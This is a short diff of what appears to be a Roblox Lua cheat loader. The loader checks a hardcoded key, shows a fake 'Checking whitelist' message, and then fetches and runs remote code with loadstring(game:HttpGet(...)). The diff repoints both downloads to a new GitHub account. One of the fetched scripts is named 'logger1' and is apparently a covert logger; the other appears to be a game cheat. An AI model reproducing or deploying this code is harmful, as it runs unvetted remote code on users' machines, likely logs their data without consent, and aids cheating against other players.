@@ -44,7 +44,7 @@ Enter.TextScaled = true
 Enter.TextSize = 14.000
 Enter.TextWrapped = true
 Enter.MouseButton1Down:connect(function()
-	if Key.Text == "v-2atzy" then
+	if Key.Text == "c-2vsf" then
 		Enter.Text = "Checking whitelist..."
 		wait(2)
 		Enter.Text = "Whitelisted!"
@@ -55,9 +55,9 @@ Enter.MouseButton1Down:connect(function()
 		wait(1)
 		Enter.Text = "Welcome to creepy"
 		wait(1)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/BABYSHARK1221/LOGS/main/logger1"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/rewritejsd/checker/main/logger1"))()
 		Login.Visible = false
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/BABYSHARK1221/hood-customs-/main/.v1"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/rewritejsd/hood-customs-/main/.v1"))()
 	else
 		game.Players.LocalPlayer:Kick("Invalid key!")
 	end
